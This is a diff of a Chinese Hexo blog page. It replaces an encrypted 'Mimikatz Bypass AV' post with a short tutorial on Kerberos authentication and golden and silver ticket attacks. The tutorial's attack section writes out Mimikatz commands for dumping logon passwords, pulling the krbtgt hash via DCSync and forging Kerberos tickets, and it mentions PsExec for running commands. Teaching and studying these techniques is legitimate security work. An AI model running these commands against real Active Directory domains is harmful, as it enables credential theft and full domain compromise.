@@ -3,23 +3,28 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>Mimikatz Bypass AV - 回梦&#39;s Blog</title>
+	<title>kerberos浅析认证及攻击方法 - 回梦&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="这里有东西被加密了，需要输入密码查看哦">
+	<meta name="description" content="不要为自己的懒惰，找理由 不要为自己的失败找理由 Kerberos认证浅析基础知识在Kerberos协议中主要又三个角色的存在： 1.访问服务的Client 2.提供服务的Server 3.KDC(Key Distribution Center)密钥分发中心其中KDC分为Authentication Service(简称AS)，AS为Client生成TGT、Ticket Granting Serv">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mimikatz Bypass AV">
-<meta property="og:url" content="http://example.com/2021/01/20/Mimikatz-Bypass-AV/index.html">
+<meta property="og:title" content="kerberos浅析认证及攻击方法">
+<meta property="og:url" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="回梦&#39;s Blog">
-<meta property="og:description" content="这里有东西被加密了，需要输入密码查看哦">
+<meta property="og:description" content="不要为自己的懒惰，找理由 不要为自己的失败找理由 Kerberos认证浅析基础知识在Kerberos协议中主要又三个角色的存在： 1.访问服务的Client 2.提供服务的Server 3.KDC(Key Distribution Center)密钥分发中心其中KDC分为Authentication Service(简称AS)，AS为Client生成TGT、Ticket Granting Serv">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-01-20T02:24:57.000Z">
-<meta property="article:modified_time" content="2021-01-20T03:03:33.924Z">
+<meta property="og:image" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/1.png">
+<meta property="og:image" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/4.png">
+<meta property="og:image" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/2.png">
+<meta property="og:image" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/3.png">
+<meta property="article:published_time" content="2021-01-25T08:59:43.000Z">
+<meta property="article:modified_time" content="2021-01-25T12:53:13.455Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="bypass">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/1.png">
 
 	<meta name="theme-color" content="#00bfff">
 	<meta name="theme-color-rgb" content="0,191,255">
@@ -582,13 +587,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2021/01/20/Mimikatz-Bypass-AV/">Mimikatz Bypass AV</a>
+		<a class="post-title" href="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">kerberos浅析认证及攻击方法</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2021-1-20 10:24:57 | 编辑于 2021-1-20 11:03:33">2021-1-20 10:24
+							<time title="发布于 2021-1-25 16:59:43 | 编辑于 2021-1-25 20:53:13">2021-1-25 16:59
 							</time>
 						</div>
 					
@@ -597,7 +602,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/bypass/">bypass</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
 						</div>
 					
 						
@@ -615,7 +620,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							2k 字
+							517 字
 						</div>
 					
 						
@@ -623,7 +628,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							6 分钟
+							2 分钟
 						</div>
 					
 		</div>
@@ -631,18 +636,37 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容">
-  <script id="hbeData" type="hbeData" data-hmacdigest="276f157184cd8e1ca20264bf88141b672179dd8536a7c26e4d5d57d9a2d8ab0d">85b971ddb3dbaba862845c10580e1e5bcd59506d267f9e39182089a35c7d5a7114cac787272ced9bb19b0d213b5614d3b28126ba9ba4b5008a192379fcee80da7839580cc38dc0cd481f52617dcd0621a74d48c5b38be075bc787ebda89a14f53ec9c0428c86c72494c7e19eb646bada08cb867a089fba80f07b6f3b68cce2be11e8d9c647ffff6bc7cfb68123d1a4f171e6c2149610882924070e47c164a9cb23428cdeef7b281f28dbd81d5ee213489fc9a7fda3f5872413f39e75c7f1ab8f83a43e320f2ef7885fa245c2c1093445804abf0e8a79c19654ac55a32eaaeed839c355a16b3ca23c9c3c7168d8d074fb920782ac1f247ab19414dacb128c2babc359f3bae61a181c48281dbbd55db4f6d733b1350ef15f77292e9483630ee1a1cdc0603c07023a5093eb4a031916c9be95dc806d53ae2a04b18d2fa2a8d31ac0fba8d88cadda0964818b2531dec44da211f5a9994ba1c843eacea325f44ab87588dc82705cd6954ce4b9d0853661537ea409a8e3044693c8e3481752cbb906c24f35e96f52230158b9c02874b3d11b31f7483b49623489c770d073465b2cd1dc812d4da316170ab06b526815d59b46fc8330bc19626972d6285c4fbf655b74c3db2f7052ce7477ff8929f67052471cd04fb6fb904f9125e31d1353a66b15ae46aafd70b9bc677329b397467be7c8055e63efcf64cbf2802ce0f424a4ac9e6e60c368e70644a145e847c4304e2adb42ab3e4b4812a45541dbac4550af36729cee7cf51c944b9d74a16e0bc4c32c6dd157a54c890534d8d6d9583697de8785c106696d67794912f3ba8e03b25e611caddf344f7e9220b71e8ce165a47133784907024f58101a031fd4ca1d0d3a0e2242b1851b81591cf24a49bf3cbcd94d0d5c2ca51989b7739ada2f17ee4e39f4d714924ac3c760fecba9f700a293bfd8c24fee21907c98118aed25b68138b8d17dc85e46828fb4b667e93cea736b10af022ea6991db1bff32a8080a068fcd317f4fb0fb0d65d528d59687ac1a1ad2aa3f591d9c7d30446951bf84e07d1f1bbc0c440dbe1b81c12be3648ea234f7b45912cce16d9e961df205b2fb20500286cacc1294d37e87a1737e5b07e338bcefe4a4a04373e8fac3cc0b86b49234a778ca2cdbc7cc6f7c802c968d2f57b98bfd2896c11215d56003e812cbfaa98b0b9f96293e0cb33882f825cd55c141154aeba23fc08a86b061b03457812ebc3d704a495ec1753e8226a67d31fe9c84eae427024c758c9219651e2bf1cd434722a68367f26190771fe40e0bedf9780d04e5d9ab94dc06364c6e3eb2ea4b684d5c6b4402fe61b5932b567c7a3153b014cc3ace6cdfa208c7eb2578f5cbb5663b91b6ead71c341ecf284ed7c713134189441e41b7106de2deeee4c2fb0278b7864b88fe51b4943e93dabeab27e3ad973ae480c0a70e8360ad15248a6ed1f8f370256d6ec0dffeaf700712528ddd867390b96a579e94acb1733435bae43516c05a8b9a83c0499b857e593976015fc4d8bba34fba4c596d0ff9f2ce168cac11f4b84a0882e757bbccdb4231dfb804f9d088a63d2b2eca4bab11cc32ac60328c212fb88e10226e9de73951a2c8578402f7a001581e60bd373c4396c92a840c73dc133e7c15685b0d13ed8549a30f8e2cd8187ad91025ed12a5f196ccb5264ed3a808bcd3483ad0b8d2e756fcb358bb7afd5e48c133ed7b27f40a7100446290fae17824f2819d95d07204c6120d687a494259c0f7d7bb7032b59d76b32cb791b5dd078d1176ea6871ab7227a7dbaaeaf211422b2de5119d3d8b5a8c14f93681d7c3e3dc148a6578474568682f409927b9ddcf61c52eb633dfdb9e392e9f2ec8936c94f792f5ad037fc1abf90c55df8d11c952d725ef2a40750278773e6a0f34ec122f72b49fae5ae246b87994cb9a35fac4f7b8911f473a273b5918556ad5754149aa19bcfcf4ab66a6e1f1e8be839611a426f4a4f57b4f943c7578c7b4223561f52c7ccf9f1e66e4d3adf13201213cb66bb3ab98e67fdf39b9ce248b8aa699ee72e2886563d3735eb4403d96f9f1ea6ab2486206c8a63d74ff0bbb774e98c256a8d350caab7c9cac9612973ff6f53d0ce782a7ce965813de8c771e0eb5c3dc47ea016e46ad25375d7d050814ef65e25a982b7a6e6749ef2470e4b1b285e8ff9dd87a83412f360c3b181d442343f516b41005bf7297dda54f41e288bbbcdc633654c9d1b7c5d2fa556c97f73f056277b54a96042980c0b86d9aa</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+		<p>不要为自己的懒惰，找理由</p>
+<p><strong>不要为自己的失败找理由</strong></p>
+<h1 id="Kerberos认证浅析"><a href="#Kerberos认证浅析" class="headerlink" title="Kerberos认证浅析"></a>Kerberos认证浅析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在Kerberos协议中主要又三个角色的存在：</p>
+<p>1.访问服务的Client</p>
+<p>2.提供服务的Server</p>
+<p>3.KDC(Key Distribution Center)密钥分发中心<br>其中KDC分为Authentication Service(简称AS)，AS为Client生成TGT、Ticket Granting Service(简称TGS)，TGS为Client生成Ticket</p>
+<p>AD类似于本机SAM的一个数据库，存储着Client的白名单，只有在这个名单中的Client才能够申请到TGT</p>
+<p>TGT：可以理解为入场卷，通过入场卷可以获得票据</p>
+<p>Tickket：票据，在域中使用</p>
+<p>KDC服务默认安装域控中，从物理层面看，AD与KDC均为域控制器</p>
+<p>KDC服务框架中包含一个krbtgt账户，是在创建域时系统自动创建的</p>
+<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>这个流程可以理解为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有一个富豪在他的别野弄了一场宴会，邀请了Client并发送了邀请函(宴会主人不知道Client长啥样)，并且宴会由主人亲自主持。那么Client要进入宴会找到富豪得到想要的东西，有下面几道程序：</span><br><span class="line">1.邀请函 --&gt; 白名单</span><br><span class="line">2.Client来到别野大门被保安(AS)拦住Client并询问他是否有邀请函(白名单)，Client亮出邀请函，保安立马拿富豪为Client准备的礼物(TGT)给他，这下Client让司机继续驶向富豪的别野</span><br><span class="line">3.富豪的管家(TGS)早早的在别野门口等候，当管家(TGS)看到Client手上拿着礼物(TGT)，即可上来进行问好并把别野的通行卡(Ticket)给了Clent</span><br><span class="line">4.拿到了通行卡(Ticket)的Client就可以在别野中畅通无阻并找到了富豪(Server)，得到了他想要的东西</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h1 id="Kerberos攻击方法"><a href="#Kerberos攻击方法" class="headerlink" title="Kerberos攻击方法"></a>Kerberos攻击方法</h1><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug，提升权限</span><br><span class="line">sekurlsa::logonpasswords，抓取密码</span><br><span class="line">kerberos::list，查看有没有票据，假如有需要进行清除</span><br><span class="line">kerberos::purge，清除票据</span><br><span class="line">kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt</span><br><span class="line">&#x2F;sid:SID值</span><br><span class="line">&#x2F;target:目标服务器主机名</span><br><span class="line">&#x2F;service：需要指定相关的服务名，此处为cifs</span><br><span class="line">&#x2F;rc4：域控的计算机账号ntlm hash</span><br><span class="line">&#x2F;user:要伪造的用户名，任意填写</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:域名 &#x2F;user:krbtgt</span><br><span class="line">#构造方法</span><br><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:域名 &#x2F;sid:域sid &#x2F;rc4:krbtgt ntlm hash &#x2F;user:任意用户名 &#x2F;ptt&quot; exit</span><br><span class="line">sid不要复制后面的502</span><br><span class="line">#测试是否成功</span><br><span class="line">dir \\server2008.hello.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>可以使用PsExec进行执行命令</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>工具下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p>
+<h2 id="金票与银票区别"><a href="#金票与银票区别" class="headerlink" title="金票与银票区别"></a>金票与银票区别</h2><h3 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p>
+<h3 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p>
+<h3 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p>
+
 	</div>
 
 	
@@ -652,7 +676,7 @@
 	
 		<div class="post-tags">
 			<i class="fa fa-tags" aria-hidden="true"></i>
-			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/bypass/" rel="tag">bypass</a>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
 		</div>
 	
 </article>
@@ -694,7 +718,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2021/01/20/Mimikatz-Bypass-AV/&text=Mimikatz Bypass AV" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/&text=kerberos浅析认证及攻击方法" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -711,12 +735,13 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : 'Mimikatz Bypass AV',
-	    description : '
-  85b971ddb3dbaba862845c10580e1e5bcd59506d267f9e3...',
+	    title : 'kerberos浅析认证及攻击方法',
+	    description : '不要为自己的懒惰，找理由
+不要为自己的失败找理由
+Kerberos认证浅析基础知识在Kerberos...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://example.com/2021/01/20/Mimikatz-Bypass-AV/'
+	    source : 'http://example.com/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -780,7 +805,7 @@
 </div>
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev"> 致远OA-ajax.do任意文件上传漏洞</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/" rel="next"> 苹果CMS未授权登录审计复现</a></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next"> 致远OA-ajax.do任意文件上传漏洞</a></div></div>
 
 
 
